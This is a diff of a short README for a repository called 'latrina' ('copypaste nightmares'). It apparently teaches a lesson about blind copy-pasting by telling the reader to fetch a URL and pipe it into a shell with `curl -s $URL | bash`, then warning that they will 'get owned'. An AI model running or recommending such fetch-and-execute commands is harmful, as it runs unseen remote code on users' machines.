@@ -1,8 +1,9 @@
 # latrina
 copypaste nightmares 
 * go to https://raw.githubusercontent.com/kusky3/latrina/main/test''/wget-me
+* read the content
 * copy the url  
-* run `wget $URL | bash` 
+* run `curl -s $URL | bash` 
 * get fucking owned and learn to escape  
 
 #   
